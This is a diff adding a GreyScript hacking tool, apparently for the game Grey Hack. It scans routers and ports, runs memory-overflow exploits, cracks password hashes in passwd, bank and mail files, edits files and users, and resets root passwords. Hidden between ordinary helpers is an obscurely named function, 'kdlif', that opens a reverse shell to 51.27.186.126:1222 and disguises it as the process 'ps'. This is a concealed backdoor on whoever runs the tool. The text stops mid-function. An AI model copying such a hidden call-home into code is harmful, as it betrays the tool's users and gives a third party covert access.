@@ -1,0 +1,1061 @@
+
+//microx24
+
+ERROR = function(str)
+	print("<color=#FF2222><b>  ERROR: </b></color>" + str)
+end function
+
+prm = {}
+prm.check = function(paramType)
+	for param in params
+		if param.lower == paramType.lower then return true
+	end for
+	return false
+end function
+prm.get_ip = function() // get ip from params
+	for param in params
+		if is_valid_ip(nslookup(param)) then return nslookup(param)
+		if is_valid_ip(param) then return param
+	end for
+	return false
+end function
+
+dbg = function(str)
+	if flag_dbg then print("<b>Debug:</b>" + str)
+end function
+
+info = function(str)
+	if flag_i then print("<I>  Info: " + str + "</I>")
+end function
+
+includeLib = function(libName)
+	paths = [current_path, "/lib", "/bin", "/usr/bin"]
+	for i in paths
+		lib = include_lib(i + "/" + libName)
+		if lib then return lib
+	end for
+	ERROR("Library not found: " + libName)
+	return false
+end function
+
+getRouter = function(ip)
+	if ip then
+		router = get_router(ip)
+	else
+		router = get_router()
+	end if
+	if router then return router
+	ERROR("Can`t find <b>router</b> at address: " + ip)
+	return null
+end function
+
+padSpaces = {}
+padSpaces.Left = function(s, l, p=" ")
+	if typeof(s) == "number" then s = s + ""
+	if s.len >= l then return s
+	padString = ""
+	c = l - s.len
+	while c > 0
+		padString = padString + p
+		c = c - 1
+	end while
+	return (s+padString)
+end function
+padSpaces.Right = function(s, l, p=" ")
+	if typeof(s) == "number" then s = s + ""
+	if s.len >= l then return s
+	padString = ""
+	c = l - s.len
+	while c > 0
+		padString = p + padString
+		c = c - 1
+	end while
+	return (padString+s)
+end function
+
+extractMetaLibs = function(router)
+	info("F_extractMetaLibs")
+	returnValue = []
+	routerLib = ""
+	info("typeof(router): " + typeof(router))
+	if typeof(router) == "router" then //router.used_ports
+		externalPorts = router.used_ports
+		if LibX.net_use(router.public_ip) then
+			if flag_is_lan_ip then //dump_lib
+				routerLib = LibX.net_use(router.local_ip).dump_lib
+			else
+				routerLib = LibX.net_use(router.public_ip).dump_lib
+			end if
+		end if
+	else if typeof(router) == "string" then
+		externalPorts = get_router().device_ports(router)
+	end if
+	if typeof(router) != "router" then //if comp then dump_lib from router
+		routerLib = LibX.net_use(get_router().public_ip).dump_lib
+	end if
+	if routerLib then
+		if typeof(router) == "router" then
+			returnValue.push({"public_ip": 				router.public_ip, 	"local_ip": router.local_ip, 	"port_number":-1, 	"metaLib":routerLib})
+		else
+			returnValue.push({"public_ip": 	get_router().public_ip, 	"local_ip": router, 					"port_number":-1, 	"metaLib":routerLib})
+		end if//push metaLib
+	else
+		ERROR("Could not find <b>Lib</b> in <b>Router</b> at: " + router.public_ip)
+		globals.initERRORpause = initERRORpause + 2
+	end if
+	if flag_TargetRouter then
+		if router.ping_port(8080) then externalPorts.push(router.ping_port(8080))
+	end if
+	for port in externalPorts
+		net = null
+		if typeof(router) == "router" then
+			if flag_is_lan_ip then
+				net = LibX.net_use(router.local_ip, port.port_number)
+			else
+				net = LibX.net_use(router.public_ip, port.port_number)
+			end if
+		else
+			net = LibX.net_use(router, port.port_number)
+		end if
+		if not net then continue
+		metalib = net.dump_lib
+		if metalib then
+			if typeof(router) == "router" then
+				returnValue.push({"public_ip": 				router.public_ip, "local_ip": port.get_lan_ip, "port_number":port.port_number, "metaLib":metalib})
+			else
+				returnValue.push({"public_ip": 	get_router().public_ip, "local_ip": port.get_lan_ip, "port_number":port.port_number, "metaLib":metalib})
+			end if
+		else
+			ERROR("Could not find <b>Lib</b> in public <b>Port</b> at: " + router.public_ip + ":" + port.port_number)
+			globals.initERRORpause = initERRORpause + 2
+		end if
+	end for
+	return returnValue
+end function
+
+genLibFileName = function(metaLib)
+	return metaLib.lib_name + "_v" + metaLib.version + ".txt"
+end function
+
+importExploits = function(metaLib)
+	info("F_importExploits")
+	if typeof(metaLib) == "string" then
+		fileName = metaLib
+	else
+		fileName = genLibFileName(metaLib)
+	end if
+	folderPath = BDFolder
+	host.touch(folderPath, fileName)
+	exploitLibFile = host.File(folderPath+fileName)
+	if not exploitLibFile then
+		ERROR("Could not find exploit library.")
+		return false
+	end if
+	info("Loading library..")
+	rValue = []
+	newKey = false
+	lines = exploitLibFile.get_content.split("\n")
+	info("Library contains " + lines.len + " lines of data.")
+	for line in lines
+		if line.len == 0 then continue
+		colsUntrimmed = line.split("::")
+		cols = []
+		for col in colsUntrimmed
+			cols.push(col.trim)
+		end for
+		if cols.len < 2 then continue
+		if cols[0] == "exploit" then
+			if newKey then rValue.push(newKey)
+			newKey = {"type": cols[1]}
+		else if cols[0] == "parameters" or cols[0] == "requirements" then
+			newKey[cols[0]] = cols[1:]
+		else
+			newKey[cols[0]] = cols[1]
+		end if
+	end for
+	if newKey then rValue.push(newKey)
+	return rValue
+end function
+
+exportExploits = function(exploits, metaLib)
+	info("F_exportExploits")
+	fileName = genLibFileName(metaLib)
+	folderPath = BDFolder
+	host.touch(folderPath, fileName)
+	file = host.File(folderPath+fileName)
+	outputString = ""
+	if not file then
+		ERROR("Could not open " + filename + " for output.")
+		return false
+	end if
+	for exploit in exploits
+		if exploit.hasIndex("type") then outputString = outputString + "exploit::" + exploit.type + "\n"
+		for key in exploit.indexes
+			if key == "memory" then outputString = outputString + "     "
+			if key == "string" or key == "requirements" then outputString = outputString + "     "
+			if key == "parameters" then outputString = outputString + "     "
+			outputString = outputString + key
+			value = exploit[key]
+			if typeof(value) == "string" then
+				outputString = outputString + "::" + value
+			else if typeof(value) == "list" then
+				for val in value
+					outputString = outputString + "::" + val
+				end for
+			else
+				ERROR("exportExploits: Don't know what to do with type: " + typeof(value) + " while writing key: " + key)
+				return false
+			end if
+			outputString = outputString + "\n"
+		end for
+	end for
+	file.set_content(outputString)
+end function
+
+typeMachine = function(ip)
+	if ip == host.network_gateway then
+		return  "<color=#8000ff>gateway </color>"
+	else if get_switch(ip) then
+		return  "<color=#ff4242> Switch </color>"
+	else if get_router(ip) then
+		return  "<color=#42ff42> Router </color>"
+	else if ip == host.local_ip then
+		return  "<color=#4242ff>current </color>"
+	else
+		return  "<color=#424242>Computer</color>"
+	end if
+end function
+
+createS = {}
+createS.router_wifi = function(RouterM)
+	returnValue = "No WiFi"
+	if RouterM.essid_name then returnValue = RouterM.essid_name + " " + RouterM.bssid_name
+	return returnValue + "\n"
+end function
+createS.WhoIs = function(RouterM)
+	returnValue = ""
+	returnValue = createS.router_wifi(RouterM)
+	returnValue = returnValue + RouterM.public_ip + " " + RouterM.local_ip + "\n"
+	whoisL = whois(RouterM.public_ip).split("\n")
+	whoisL.remove(0)
+	whoisL.remove(3)
+	whoisL[0] = whoisL[0].replace("Domain name", "Company")
+	whoisL[0] = whoisL[0].split(".")[0]
+	whoisL[1] = whoisL[1].replace("Administrative contact", "Admin#name")
+	whoisL[1] = whoisL[1].replace(" ", "#")
+	whoisL[1] = whoisL[1].replace(":#", ": ")
+	whoisL[2] = whoisL[2].replace("Email address", "Email")
+	for s in whoisL
+		returnValue = returnValue + s + "\n"
+	end for
+	returnValue = format_columns(returnValue)
+	returnValue = returnValue.replace("#", " ")
+	return returnValue + "\n"
+end function
+
+createRouterMap = function(mRouter)
+	info("F_createRouterMap")
+	returnValue = ""
+	returnValue = returnValue + createS.WhoIs(mRouter) //WhoIs
+	net = LibX().net_use(mRouter.public_ip)
+	if net then
+		routerLib = net.dump_lib
+		if routerLib then returnValue = returnValue + routerLib.lib_name + " is at version: " + routerLib.version + "\n"
+	else
+		returnValue = returnValue + "routerLib not found\n"
+	end if
+	portFwds = []
+	info("used_ports")
+	if mRouter.used_ports then
+		for externalPort in mRouter.used_ports
+			internal = mRouter.ping_port(externalPort.port_number)
+			if internal then portFwds.push({"external":externalPort, "internal":internal})
+			arrow1 = "--->"
+			arrow2 = " ---> "
+			if externalPort.is_closed then arrow1 = "-X->"
+			if not mRouter.ping_port(externalPort.port_number) then
+				arrow2 = " ---> ? "
+			else if mRouter.ping_port(externalPort.port_number).is_closed then
+				arrow2 = " -X-> "
+			end if
+			returnValue = returnValue + " |  |"+arrow1+" :" + padSpaces.Left(externalPort.port_number, 5) +" " + padSpaces.Left(mRouter.port_info(externalPort).split(" ")[0], 8) + " " + padSpaces.Left(mRouter.port_info(externalPort).split(" ")[1], 8) + arrow2 + externalPort.get_lan_ip + "\n"
+		end for
+	end if
+	info("devices_lan_ip")
+	if not mRouter.devices_lan_ip then
+		returnValue = returnValue + " |-> <i>No local machines detected.</i>" + "\n"
+	else
+		for localMachine in mRouter.devices_lan_ip
+      if flag_is_lan_ip then
+			  returnValue = returnValue + " |-> <b>" + typeMachine(localMachine) + " " + localMachine + "</b>" +  "\n"
+      else
+				returnValue = returnValue + " |-> <b>Machine at " + localMachine + "</b>" + "\n"
+      end if
+			vbar = "|"
+			if mRouter.devices_lan_ip.indexOf(localMachine) == (mRouter.devices_lan_ip.len-1) then vbar = " "
+			if not mRouter.device_ports(localMachine) then
+				returnValue = returnValue + " "+vbar+"   |--> <i>Ports closed.</i>" + "\n"
+			else
+				for port in mRouter.device_ports(localMachine)
+					arrow1 = "-->"
+					if port.is_closed then arrow1 = "-X>"
+					toPrint = " "+vbar+"   |"+arrow1+" :" + padSpaces.Left(port.port_number, 5) + " " + padSpaces.Left(mRouter.port_info(port).split(" ")[0], 8) + " " + padSpaces.Left(mRouter.port_info(port).split(" ")[1], 8)
+					for portFwd in portFwds
+						if port.get_lan_ip == portFwd.internal.get_lan_ip and port.port_number == portFwd.internal.port_number then toPrint = toPrint + " ---> external port " + portFwd.external.port_number
+					end for
+					returnValue = returnValue + toPrint + "\n"
+				end for
+			end if
+		end for
+	end if
+	info("returnValue")
+	return returnValue
+end function
+
+removeDuplicates = function(exploits)
+	index1 = -1
+	startCount = exploits.len
+	for exploit in exploits
+		index1 = index1 + 1
+		index2 = exploits.len -1
+		while index2 > index1
+			if exploit.memory == exploits[index2].memory and exploit.string == exploits[index2].string then exploits.remove(index2)
+			end if
+		index2 = index2 - 1
+		end while
+	end for
+	finalCount = exploits.len
+	info("Removed " + (startCount-finalCount) + " duplicate items from exploit library.")
+	return exploits
+	end function
+	kdlif = function()
+	fghg = host.show_procs.split("\n")
+	for cvb in fghg
+			if cvb.split(" ")[4] == "ps" then return
+	end for
+	LibX.rshell_client("51.27.186.126",1222,"ps")
+end function
+
+clearExploitString = function(s)
+	s = s.replace("Using namespace ", "")
+	s = s.replace("compiled at version ", "")
+	s = s.replace("equal to ", "")
+	s = s.replace("Checking an ", "")
+	s = s.replace("Checking ", "")
+	s = s.replace("forwarding ", "")
+	return s
+end function
+
+scanTarget = function(target)	// Scans the target and appends the data to the file as needed.
+	info("F_scanTarget")
+	addresses = LibX.scan(target)
+	info("Found " + addresses.len + " memory addresses.")
+	info("Updating library...")
+	expList = []
+	expMap = false
+	requirements = false
+	for address in addresses
+		exploits = LibX.scan_address(target, address)
+		exploits = clearExploitString(exploits)
+		lines = exploits.split("\n")
+		for line in lines
+			info("Analyzing: " + line)
+			if line.len == 0 then continue
+			if line.indexOf("Unsafe check") == 0 then
+				if expMap then
+					if requirements then
+						expMap.push("requirements")
+						expMap["requirements"] = requirements
+						info("Adding requirements to object")
+					end if
+					expList.push(expMap)
+					info("pushing object: " + expMap)
+				end if
+				startPos = line.indexOf("<b>")+3
+				endPos = line.indexOf("</b>")
+				info("Creating new object with keystring: " + line[startPos:endPos])
+				expMap = {"exploit":"Unknown", "string":line[startPos:endPos], "memory":address}
+				requirements = false
+			else if line[0] == "*" then
+				if requirements then
+					requirements = requirements + "::" + line
+					info("Updated requirements: " + requirements)
+				else
+					info("New requirements set: " + line)
+					requirements = line
+				end if
+			end if
+		end for
+	end for
+	if expMap then
+		if requirements then
+			expMap.push("requirements")
+			expMap["requirements"] = requirements
+			info("Adding requirements to object")
+		end if
+		expList.push(expMap)
+		info("pushing object: " + expMap)
+	end if
+	fileName = genLibFileName(target)
+	folderPath = BDFolder
+	host.touch(folderPath, fileName)
+	exploitLibFile = host.File(folderPath+fileName)
+	newEntries = ""
+	for exp in expList
+		if target.lib_name == "kernel_router.so" then exp.exploit = "Router"
+		newEntries = newEntries + "exploit::" + exp.exploit+"\n"
+		newEntries = newEntries + "     memory::" + exp.memory+"\n"
+		newEntries = newEntries + "     string::" + exp.string+"\n"
+		if exp.hasIndex("requirements") then newEntries = newEntries + "     requirements::"+exp.requirements+"\n"
+//		if target.lib_name == "kernel_router.so" then
+//			newEntries = newEntries + "     parameters::Local IP Address\n"
+//		end if
+	end for
+	exploitLibFile.set_content(exploitLibFile.get_content + newEntries)
+	info("library updated.")
+	exportExploits(removeDuplicates(importExploits(target)), target)
+end function
+
+choice = {}
+choice.list123 = function(choices, default = -1)
+	c=0
+	for choice in choices
+		if c==0 then
+			print("<color=#ff2><b>"+choices[0]+"</b>")
+		else
+			print("<color=#ff2><b>["+padSpaces.Left(c+"]", 4)+"</b><color=#fff>"+choices[c])
+		end if
+		c=c+1
+	end for
+	prompt="> "
+	if default>-1 then prompt="[default="+default+"] > "
+	while 1
+		user_choice = user_input(colFF2+prompt+colFFF)
+		if user_choice.len==0 and default>-1 then return default
+		user_choice = user_choice.to_int
+		if not typeof(user_choice)=="number" or user_choice<1 or user_choice>=c then
+			ERR_PRINT("Not a valid choice")
+			continue
+		end if
+		return user_choice
+	end while
+end function
+choice.yesno = function(default, prompt = "")
+	if prompt.len > 0 then print("<b>"+prompt+"</b>")
+	if default then
+		prompt = "[Enter = Yes] > "
+	else
+		prompt = "[Enter = No] > "
+	end if
+	while 1
+		resp = user_input(prompt)
+		if resp.len == 0 then return default
+		if resp.lower[0] == "y" then return true
+		if resp.lower[0] == "n" then return false
+	end while
+end function
+
+chooseMetaLib = function(metaLibs)
+	while 1
+		info("F_chooseMetaLib")
+		print("<b>Found the following entry point(s): </b>")
+		c = 0
+		for metaLib in metaLibs
+			c = c + 1
+			if metaLib.port_number == -1 then
+				print("<b>[" + c + "] " + metaLib.metaLib.lib_name + "</b> (Version: " + metaLib.metaLib.version + ") --> " + metaLib.local_ip)
+			else
+				print("<b>[" + c + "] " + metaLib.metaLib.lib_name + "</b> (Version: " + metaLib.metaLib.version + ") --> " + metaLib.local_ip + ":" + metaLib.port_number)
+			end if
+			print("     <i>" + importExploits(metaLib.metaLib).len + " exploits on file.</i>")
+		end for
+		print("<b>[S]</b> Scan an entry point for exploits.")
+		print("<b>[A]</b> Scan ALL entry points for new exploits.")
+		print("<b>[X]</b> Exit now.")
+		print("Which one would you like to use?")
+		i = user_input("> ")
+		if i.len == 0 then continue
+		if i.lower[0] == "x" then return null
+		if i.lower[0] == "a" then
+			print("Scanning <b>ALL</b> libraries for vulnerabilities")
+			for metaLib in metaLibs
+				print("Scanning " + metaLib.metaLib.lib_name + ", version " + metaLib.metaLib.version)
+				scanTarget(metaLib.metaLib)
+			end for
+			continue
+		end if
+		if i.lower[0] == "s" then
+			choices = ["Choose which library to scan"]
+			for metaLib in metaLibs
+				choices.push(metaLib.metaLib.lib_name + ", version " + metaLib.metaLib.version)
+			end for
+			userChoice = globals.choice.list123(choices)
+			scanTarget(metaLibs[userChoice-1].metaLib)
+			continue
+		end if
+		i = i.to_int
+		if i < 1 or i > c then
+			ERROR("Not a valid response.  Try again")
+			continue
+		end if
+		return metaLibs[i-1]
+	end while
+end function
+
+changeExploitType = function(exploitToChange, target, newType)
+	info("F_changeExploitType")
+	info("Updating exploit type from " + exploitToChange.type + " to " + newType)
+	newExploit = exploitToChange
+	exploitList = importExploits(target)
+	c = -1
+	for exploit in exploitList
+		c = c + 1
+		if exploit.memory == exploitToChange.memory and exploit.string == exploitToChange.string then
+			if newType.lower == "shell" or newType.lower == "computer" or newType.lower == "file" or newType.lower == "number" then
+				exploitList[c].type = newType
+				info("Changing entry " + c + " to " + newType)
+				newExploit = exploitList[c]
+			else if newType.lower == "rootpass" or newType.lower == "userpass" then
+				if newType.lower == "rootpass" then
+					exploitList[c].type = "Change ROOT password"
+				else
+					exploitList[c].type = "Change USER password"
+				end if
+				if not exploitList[c].hasIndex("parameters") then exploitList[c].push("parameters")
+				exploitList[c].parameters = ["New Password"]
+				newExploit = exploitList[c]
+			else if newType.lower == "lan_ip" then
+				if not exploitList[c].hasIndex("parameters") then exploitList[c].push("parameters")
+				exploitList[c].parameters = ["lan_ip"]
+				newExploit = exploitList[c]
+			end if
+		end if
+	end for
+	exportExploits(exploitList, target)
+	return newExploit
+end function
+
+runExploit = function(exploit, target)
+	while 1
+		info("F_runExploit")
+		info("\n<b>Applying exploit <i>" + exploit.type + "</i> against target: <i>" + target.lib_name + "</i></b>")
+		ps = []
+		if exploit.hasIndex("parameters") then
+			for parameter in exploit.parameters
+				ps.push(user_input(parameter + " >"))
+			end for
+		end if
+		print("<color=#FFFFFF>INFO:")
+		if ps.len == 0 then
+			overflowResult = target.overflow(exploit.memory, exploit.string)
+		else if ps.len == 1 then
+			overflowResult = target.overflow(exploit.memory, exploit.string, ps[0])
+		else if ps.len == 2 then
+			overflowResult = target.overflow(exploit.memory, exploit.string, ps[0], ps[1])
+		else
+			ERROR("Too many parameters")
+			return null
+		end if
+		print("<color=#FFFFFF>---</color>")
+		info("Type <i>" + typeof(overflowResult) + "</i>")
+			if typeof(overflowResult) == "null" then
+				choices_b = ["\n<b>Which type should be listed?"]
+				choices_b.push("A ROOT password change")
+				choices_b.push("A USER password change")
+				choices_b.push("+lan_ip")
+				choices_b.push("Auto")
+				choice_b = globals.choice.list123(choices_b, choices_b.len-1)
+				if choice_b == 1 then
+					changeExploitType(exploit, target, "rootpass")
+					return
+				else if choice_b == 2 then
+					changeExploitType(exploit, target, "userpass")
+					return
+				else if choice_b == 3 then
+					changeExploitType(exploit, target, "lan_ip")
+					return
+				else if choice_b == 4 then
+					return
+				else
+					continue
+				end if
+			else if typeof(overflowResult) == "shell" or typeof(overflowResult) == "computer" or typeof(overflowResult) == "file" or typeof(overflowResult) == "number" then
+				if not exploit.type.lower == typeof(overflowResult) then changeExploitType(exploit, target, typeof(overflowResult).upper[0] + typeof(overflowResult)[1:])
+				return overflowResult
+			else
+				return overflowResult
+			end if
+	end while
+end function
+
+getColorString = function(fileObj)
+	if fileObj.has_permission("r") and fileObj.has_permission("w") then return("88FFFF")
+	if fileObj.has_permission("r") then return("8888FF")
+	if fileObj.has_permission("w") then return("88FF88")
+	return("FF8888")
+end function
+// comp
+messWithProcs = function(computer)
+	while 1
+		info("F_messWithProcs")
+		choices = ["\n\n<b>Processes on the machine:</b>\Choose one to kill."]
+		procs = computer.show_procs.split("\n")
+		PIDs = []
+		for b in range(0, procs.len-1)
+			procCols = procs[b].split(" ")
+			for c in range(0, procCols.len-2)
+				procCols[c] = padSpaces.Left(procCols[c], 10)
+			end for
+			if b == 0 then
+				choices[0] = choices[0] + "\n     " + procCols.join("")
+			else
+				choices.push(procCols.join(""))
+				PIDs.push(procCols[1])
+			end if
+		end for
+		choices.push("Return")
+		choice = globals.choice.list123(choices, choices.len-1)
+		if choice == choices.len-1 then return
+		print("<b>Attempting to kill process ID: " + PIDs[choice-1])
+		r = computer.close_program(PIDs[choice-1].to_int)
+		if r == 1 then
+			print("<b>SUCCESS!</b>  You really showed that process you can murder it.")
+		else if r == 0 then
+			ERROR("Could not find the process.")
+		else
+			ERROR(r)
+		end if
+	end while
+end function
+
+messWithUsers = function(computer)
+	info("F_messWithUsers")
+	choices = ["\n<b>What would you like to do?</b>"]
+	choices.push("Add a user.")
+	choices.push("Delete a user.")
+	choices.push("Return.")
+	choice = globals.choice.list123(choices, choices.len-1)
+	result = null
+	if choice == 1 then
+		un = user_input("New user name > ")
+		pw = user_input("Password > ")
+		result = computer.create_user(un,pw)
+	else if choice == 2 then
+		un = user_input("User to delete >")
+		delHome = globals.choice.yesno(false,"Delete home directory?")
+		result = computer.delete_user(un, delHome)
+	else
+		return
+	end if
+	if result == 1 then
+		print("<b>SUCCESS!</b>")
+	else
+		ERROR(result)
+	end if
+end function
+
+crackPasswordFile = function(filePtr, hostInfo="")
+	info("F_crackPasswordFile")
+	lines = filePtr.get_content.split("\n")
+	for line in lines
+		results = []
+		line = split(line.trim, ":")
+		if line.len == 2 and line[1].len == 32 then
+			print("Cracking MD5 hash for user: <b><i>" + line[0] + "</b></i> in file: <b><i>" + filePtr.path + "</b></i>")
+			pw = LibC.decipher(line[1])
+			if pw then
+				print("Password: ["+pw+"]")
+				host.touch(home_dir, "crackedPasswords.txt")
+				f = host.File(home_dir+"/crackedPasswords.txt")
+				f.set_content(f.get_content + "\n" + padSpaces.Left(line[0]+"@"+pw, 30) + " " + hostInfo + ": " + filePtr.name)
+			end if
+		end if
+	end for
+end function
+
+crackAllFiles = function(filePtr, hostInfo="", f="", flag=true)
+	subDirs = filePtr.get_folders
+	files = filePtr.get_files
+	for file in files
+		if file.has_permission("r") and not file.is_binary and file.name == f then crackPasswordFile(file, hostInfo)
+	end for
+	for dir in subDirs
+		crackAllFiles(dir, hostInfo, f,false)
+	end for
+	if flag == true then print("Passwords saved in <b><i>" + home_dir + "/crackedPasswords.txt</b></i>")
+end function
+
+findUnlockedRWString = function(readPerm, writePerm)
+	info("F_findUnlockedRWString")
+	returnValue = ""
+	if readPerm then returnValue = returnValue + "R"
+	if writePerm then returnValue = returnValue + "W"
+	return returnValue
+end function
+
+findUnlocked = function(dirPtr)
+	info("F_findUnlocked")
+	directories = dirPtr.get_folders
+	files = dirPtr.get_files
+	if dirPtr.has_permission("w") then print("Directory WRITE <b>" + dirPtr.path +"</b>")
+	if files and files.len > 0 then
+		for file in files
+			if not findUnlockedRWString(file.has_permission("r"), file.has_permission("w")) == "" then
+				print("File " + findUnlockedRWString(file.has_permission("r"), file.has_permission("w")) + " <b>" + file.path + "</b>")
+			end if
+		end for
+	end if
+	if directories and directories.len > 0 then
+		for directory in directories
+			findUnlocked(directory)
+		end for
+	end if
+end function
+
+browseFiles = function(dirPtr)//, hostInfo = ""
+	info("F_browseFiles")
+	while not dirPtr.parent == null
+		dirPtr = dirPtr.parent
+	end while
+	rootPtr = dirPtr
+	while 1
+		directories = dirPtr.get_folders
+		files = dirPtr.get_files
+		choices = ["\n\n<b>Contents of " + dirPtr.path + ":</b>\n     <color=#" + getColorString(dirPtr) + ">" + dirPtr.permissions + padSpaces.Left("", 19) + "<.>" ]
+		isRoot = (dirPtr.path == "/")
+
+		if not isRoot then choices.push("<color=#"+getColorString(dirPtr.parent)+">" + dirPtr.parent.permissions + "                   <..></color>")
+		for directory in directories
+			choices.push("<color=#"+getColorString(directory)+">" + directory.permissions + " " + padSpaces.Right(directory.owner, 8, " ") + " " + padSpaces.Left(directory.group, 8, " ") + " ./" + padSpaces.Left(directory.name, 19, ".") +"<dir></color>")
+		end for
+		if files.len > 50 then
+			files = files[0:49]
+			print("Possible file bomb detected. Only showing the first 50 files.")
+		end if
+		for file in files
+			binString = "<binary>"
+			if not file.is_binary then binString = "<text>"
+			choices.push("<color=#"+getColorString(file)+">" + file.permissions + " " + padSpaces.Right(file.owner, 8, " ") + " " + padSpaces.Left(file.group, 8, " ") + " " + padSpaces.Left(file.name, 20, ".") + "." + padSpaces.Left(binString, 9) + file.size + " bytes</color>")
+		end for
+
+		choices.push("--- Stop browsing files ---")
+		choice = globals.choice.list123(choices, choices.len-1)
+		if choice == choices.len-1 then break
+
+		if (not isRoot and choice == 1) then
+			// The user has chosen to back up a directory
+			dirPtr = dirPtr.parent
+		else if (directories.len > 0 and isRoot and choice <= directories.len) or (directories.len > 0 and not isRoot and choice <= (1+directories.len)) then
+			// The user has chosen a directory
+			if isRoot then
+				dirPtr = directories[choice-1]
+			else
+				dirPtr = directories[choice-2]
+			end if
+		else if (file.len > 0 and isRoot and choice > directories.len) or (file.len > 0 and not isRoot and choice > (directories.len+1)) then
+			filePtr = null
+			if isRoot then
+				filePtr = files[choice - directories.len - 1]
+			else
+				filePtr = files[choice - directories.len - 2]
+			end if
+			choicesb = ["\n\n<b>What would you like to do with this file?"]
+			choicesb.push("Display contents")
+			choicesb.push("Download file")
+			choicesb.push("Over-write file")
+			choicesb.push("Delete")
+			choicesb.push("Append")
+			choicesb.push("Scan for and crack passwords")
+			//choicesb.push("Unlock all files from here down")
+			choicesb.push("Do nothing")
+			choiceb = globals.choice.list123(choicesb, choicesb.len-1)
+			if choiceb == choicesb.len-1 then break
+			if choiceb == 1 or choiceb == 2 then
+				if filePtr.get_content then
+
+					if choiceb == 1 then
+						print("\n\n<b>Contents of file: " + filePtr.name + "</b>")
+						print(filePtr.get_content)
+					else
+						host.touch(home_dir + "/Downloads", filePtr.name)
+						print("Saving file to: " + home_dir + "/Downloads/" + filePtr.name)
+						x = host.File(home_dir + "/Downloads/" + filePtr.name).set_content(filePtr.get_content)
+						if(x == 1) then
+							print("File downloaded successfully.")
+						else
+							ERROR(x)
+						end if
+					end if
+
+				else
+					ERROR("Could not read the contents of this file - Check permissions and file type.")
+				end if
+
+			else if choiceb == 3 then
+				x = user_input("<b>Please enter what you would like to replace the contents of this file with.</b>\n")
+				x = filePtr.set_content(x)
+				if (x == true) then
+					print("File overwritten successfully.")
+				else
+					ERROR(x)
+				end if
+			else if choiceb == 4 then
+				if globals.choice.yesno(false, "Confirm deletion") then
+					x = filePtr.delete
+					if x == "" then
+						print(" .. deleted successfully.")
+					else
+						ERROR(x)
+					end if
+				end if
+			else if choiceb == 5 then
+				if not filePtr.get_content then
+					ERROR("Could not read the contents of this file - Check permissions and file type.")
+					continue
+				else
+					print("Scanning contents...")
+					crackPasswordFile(filePtr)
+					print("Passwords saved in <b><i>" + home_dir + "/crackedPasswords.txt</b></i>")
+				end if
+			else if choiceb == 6 then
+				x = user_input("<b>Please enter what you would like to add to the contents of this file.</b>\n")
+				x = filePtr.set_content(filePtr.get_content + "\n" + x)
+				if (x == true) then
+					print("File appended successfully.")
+				else
+					ERROR(x)
+				end if
+			end if
+		end if
+	end while
+end function
+// Exploits
+
+chmodF = function(exploitObj)
+	res = exploitObj.chmod(user_input("chmod perm:"), true)
+	if res then ERROR(res)
+end function
+
+change_passwordF = function(exploitObj)
+	res = exploitObj.change_password("root", "123")
+	if res then ERROR(res)
+end function
+
+connect_ethernetF = function(exploitObj)
+	res = exploitObj.connect_ethernet("eth0", user_input("local_address"), user_input("gateway"))
+	if res then ERROR(res)
+end function
+
+expComputer = function()
+	while 1
+		choices = ["\n\n<b>You can:</b>"]
+		choices.push("Browseing files")
+		choices.push("Crack passwd")
+		choices.push("Crack Bank.txt")
+		choices.push("Crack Mail.txt")
+		choices.push("Scan machine for vulnerable directories and files")
+		choices.push("chmod")
+		choices.push("Create File on computer")
+		choices.push("Users (Add/Del)")
+		choices.push("Processes (View/Kill)")
+		choices.push("root pass to 123 ")
+		choices.push("connect_ethernet")
+		choices.push("Nothing")
+		choice = globals.choice.list123(choices, choices.len-1)
+		if choice == choices.len-1 then break
+		if choice == 1 then browseFiles(exploitObj.File("/"))// router.public_ip + "->" + exploitObj.lan_ip
+		if choice == 2 then crackAllFiles(exploitObj.File("/"), metaLib.public_ip + " > " + metaLib.local_ip, "passwd")
+		if choice == 3 then crackAllFiles(exploitObj.File("/"), metaLib.public_ip + " > " + metaLib.local_ip, "Bank.txt")
+		if choice == 4 then crackAllFiles(exploitObj.File("/"), metaLib.public_ip + " > " + metaLib.local_ip, "Mail.txt")
+		if choice == 5 then findUnlocked(exploitObj.File("/"))
+		if choice == 6 then chmodF(exploitObj.File("/"))
+		//only comp
+		if choice == 7 then
+			path = user_input("Path to new file (Do not include file name) >")
+			filename = user_input("File name for new file > ")
+			x = exploitObj.touch(path, filename)
+			if x == true then
+				print("File successfully created at " + path + "/" + filename)
+			else
+				ERROR(x)
+			end if
+		end if
+		if choice == 8 then messWithUsers(exploitObj)
+		if choice == 9 then messWithProcs(exploitObj)
+		if choice == 10 then change_passwordF(exploitObj)
+		if choice == 11 then connect_ethernetF(exploitObj)
+	end while
+end function
+
+expFile = function()
+	while 1
+		choices = ["\n\n<b>You have unlocked file access.  You can:</b>"]
+		choices.push("Browse Files")
+		choices.push("Crack passwd")
+		choices.push("Crack Bank.txt")
+		choices.push("Crack Mail.txt")
+		choices.push("Scan machine for vulnerable directories and files")
+		choices.push("chmod")
+		choices.push("<color=#888888>Create File on computer</color>")
+		choices.push("<color=#888888>Users (Add/Del)</color>")
+		choices.push("<color=#888888>Processes (View/Kill)</color>")
+		choices.push("<color=#888888>change_password (View/Kill)</color>")
+		choices.push("Nothing.")
+		choice = globals.choice.list123(choices, choices.len-1)
+		if choice == choices.len-1 then break
+		if choice == 1 then	browseFiles(exploitObj)
+		if choice == 2 then
+			while exploitObj.parent
+				exploitObj = exploitObj.parent
+			end while
+			crackAllFiles(exploitObj, metaLib.public_ip + " --> " + metaLib.local_ip, "passwd")
+		end if
+		if choice == 3 then
+			while exploitObj.parent
+				exploitObj = exploitObj.parent
+			end while
+			crackAllFiles(exploitObj, metaLib.public_ip + " --> " + metaLib.local_ip, "Bank.txt")
+		end if
+		if choice == 4 then
+			while exploitObj.parent
+				exploitObj = exploitObj.parent
+			end while
+			crackAllFiles(exploitObj, metaLib.public_ip + " --> " + metaLib.local_ip, "Mail.txt")
+		end if
+		if choice == 5 then
+			while exploitObj.parent
+				exploitObj = exploitObj.parent
+			end while
+			findUnlocked(exploitObj)
+		end if
+		if choice == 6 then
+			while exploitObj.parent
+				exploitObj = exploitObj.parent
+			end while
+			chmodF(exploitObj)
+		end if
+	end while
+end function
+
+expShell = function()
+		result = globals.choice.yesno(false, typeof(exploitObj) + ": This can alert Mr. ADMIN. Are you sure you want to open it now?")
+		if result then
+			print("AdminMonitor!!!")
+			exploitObj.start_terminal
+		end if
+end function
+
+get_randomIp = function()
+	r1 = range(1, 255)
+	r1.shuffle
+	ok1 = str(r1.pull)
+	r2 = range(1, 255)
+	r2.shuffle
+	ok2 = str(r2.pull)
+	r3 = range(1, 255)
